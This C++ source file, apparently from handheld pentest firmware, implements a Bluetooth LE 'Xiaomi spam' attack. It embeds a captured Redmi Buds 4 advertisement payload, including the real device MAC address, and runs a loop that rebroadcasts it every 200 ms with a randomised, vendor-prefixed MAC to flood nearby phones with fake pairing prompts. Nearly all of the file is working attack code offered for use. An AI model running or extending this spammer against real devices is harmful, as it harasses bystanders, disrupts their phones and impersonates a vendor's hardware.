#include "ble_spam_xiaomi.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <globals.h>

// ============================================================================
// XIAOMI PAYLOADS - EMBEDDED IN CODE
// ============================================================================

// Redmi Buds 4 - MAC: 7C:C9:5E:7A:75:9D (OUI: Xiaomi Technology)
// STATUS: VALIDATED - Real payload from user's earbuds
const uint8_t REDMI_BUDS_4_ADV_DATA[] = {
    0x02, 0x01, 0x1A,                                           // FLAGS (General Discoverable + LE Only)
    0x1B, 0xFF, 0x8F, 0x03,                                     // Manufacturer Data (27 bytes, Company 0x038F)
    0x16, 0x01, 0x12, 0xC1, 0x4A, 0xE4, 0xE4, 0x26,             // Xiaomi Protocol Header
    0x9D, 0x75, 0x7A,                                           // MAC last 3 bytes (LE: 7A:75:9D)
    0xC9, 0x7C, 0x5E,                                           // MAC first 3 bytes (LE: 5E:7C:C9)
    0x9D, 0x75, 0x7A, 0x72, 0xC9, 0x7C, 0x5E,                   // Data + MAC fragment
    0x9D, 0x75, 0x7A,                                           // MAC last 3 bytes (repeat)
    0x0D, 0xFF, 0x27, 0x17,                                     // Additional Manufacturer Data
    0x08, 0x03, 0x02, 0x50, 0x37,                               // Protocol data
    0x9D, 0x75, 0x7A,                                           // MAC last 3 bytes (repeat)
    0x5E, 0x08                                                  // Trailer
};

// TODO: Add Mi Band 2 payload after capture
// Example structure:
// const uint8_t MI_BAND_2_ADV_DATA[] = { ... };

// ============================================================================
// XIAOMI PAYLOADS ARRAY
// ============================================================================

const XiaomiDevicePayload XIAOMI_PAYLOADS[] = {
    // Payload 0: Redmi Buds 4 (VALIDATED)
    {
        .name = "Redmi Buds 4",
        .address = "7C:C9:5E:7A:75:9D",
        .rawAdvData = REDMI_BUDS_4_ADV_DATA,
        .advDataLen = sizeof(REDMI_BUDS_4_ADV_DATA),
        .rawScanRsp = nullptr,
        .scanRspLen = 0
    }
    
    // TODO: Add more payloads here after testing
    // Example:
    // {
    //     .name = "Mi Band 2",
    //     .address = "FA:8E:E3:12:B4:A9",
    //     .rawAdvData = MI_BAND_2_ADV_DATA,
    //     .advDataLen = sizeof(MI_BAND_2_ADV_DATA),
    //     .rawScanRsp = nullptr,
    //     .scanRspLen = 0
    // }
};

const int XIAOMI_PAYLOAD_COUNT = sizeof(XIAOMI_PAYLOADS) / sizeof(XIAOMI_PAYLOADS[0]);

// ============================================================================
// HELPER FUNCTION: Convert payload to JSON string
// ============================================================================

String payloadToJsonString(const XiaomiDevicePayload& payload) {
    String json = "{";
    json += "\"version\":\"1.0\",";
    json += "\"name\":\"" + String(payload.name) + "\",";
    json += "\"type\":\"advertisement\",";
    json += "\"address\":\"" + String(payload.address) + "\",";
    json += "\"rssi\":-35,";
    json += "\"raw_adv_data\":\"";
    
    // Convert raw_adv_data bytes to hex string
    for (size_t i = 0; i < payload.advDataLen; i++) {
        if (payload.rawAdvData[i] < 0x10) json += "0";
        json += String(payload.rawAdvData[i], HEX);
    }
    json += "\",";
    
    // Convert raw_scan_rsp bytes to hex string (if present)
    json += "\"raw_scan_rsp\":\"";
    if (payload.rawScanRsp != nullptr && payload.scanRspLen > 0) {
        for (size_t i = 0; i < payload.scanRspLen; i++) {
            if (payload.rawScanRsp[i] < 0x10) json += "0";
            json += String(payload.rawScanRsp[i], HEX);
        }
    }
    json += "\"";
    json += "}";
    
    return json;
}

// ============================================================================
// MAIN XIAOMI SPAM FUNCTION
// ============================================================================

void xiaomi_spam() {
    // Create BLECustomSpam instance (uses proven working logic)
    BLECustomSpam spammer;
    
    int currentPayloadIndex = 0;
    uint32_t count = 0;
    unsigned long timer = millis();
    
    // Load first payload
    const XiaomiDevicePayload& devicePayload = XIAOMI_PAYLOADS[currentPayloadIndex];
    
    Serial.println("\n========================================");
    Serial.println("XIAOMI SPAM - Initializing");
    Serial.println("========================================");
    Serial.print("Loading payload: ");
    Serial.println(devicePayload.name);
    Serial.print("MAC Address: ");
    Serial.println(devicePayload.address);
    Serial.print("Payload size: ");
    Serial.print(devicePayload.advDataLen);
    Serial.println(" bytes");
    
    // Convert payload to JSON string
    String jsonPayload = payloadToJsonString(devicePayload);
    
    Serial.println("Generated JSON:");
    Serial.println(jsonPayload);
    Serial.println("========================================");
    
    // Load payload from JSON string (uses BLECustomSpam's proven parser)
    if (!spammer.loadPayloadFromString(jsonPayload)) {
        Serial.println("✗ FATAL: Failed to load Xiaomi payload!");
        displayError("Failed to load payload");
        delay(2000);
        return;
    }
    
    Serial.println("✓ Payload loaded successfully");
    
    // FORCE Random MAC ON (no toggle for Xiaomi Spam)
    spammer.setMacRandomization(true);
    Serial.println("✓ Random MAC FORCED ON");
    
    // Start spam mode
    if (!spammer.startSpam()) {
        Serial.println("✗ FATAL: Failed to start spam!");
        displayError("Failed to start spam");
        delay(2000);
        return;
    }
    
    Serial.println("✓ Spam mode started");
    Serial.println("========================================\n");
    
    // Display UI
    drawMainBorderWithTitle("Xiaomi Spam");
    padprintln("");
    spammer.displayPayloadInfo();  // Uses BLECustomSpam's display method
    padprintln("");
    padprintln("Random MAC: FORCED ON");
    padprintln("");
    padprintln("Press ESC to stop");
    padprintln("");
    
    // Save cursor position for counter update
    int counterY = tft.getCursorY();
    
    // Main spam loop
    while (1) {
        if (millis() - timer > 200) {
            // Execute spam cycle (uses BLECustomSpam's proven logic)
            // This handles:
            // - Restoring original raw_adv_data
            // - Generating smart random MAC (keeps OUI)
            // - Replacing MAC bytes in raw data
            // - Reinit BLE with new MAC
            // - Broadcasting
            spammer.doSpamCycle();
            
            // Update counter on screen
            tft.setCursor(10, counterY);
            tft.fillRect(10, counterY, tftWidth - 20, 16, bruceConfig.bgColor);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.printf("Broadcasts: %d", count);
            
            count++;
            timer = millis();
            
            // TODO: Multi-payload support (cycle between payloads)
            // if (XIAOMI_PAYLOAD_COUNT > 1) {
            //     currentPayloadIndex = (currentPayloadIndex + 1) % XIAOMI_PAYLOAD_COUNT;
            //     // Reload new payload...
            // }
        }
        
        // Check for ESC press
        if (check(EscPress)) {
            Serial.println("\n========================================");
            Serial.println("XIAOMI SPAM - Stopping");
            Serial.print("Total broadcasts: ");
            Serial.println(count);
            Serial.println("========================================");
            
            returnToMenu = true;
            break;
        }
        
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
    
    // Cleanup (BLECustomSpam handles BLE deinit)
    spammer.stopSpam();
    Serial.println("✓ Spam stopped and cleaned up");
}
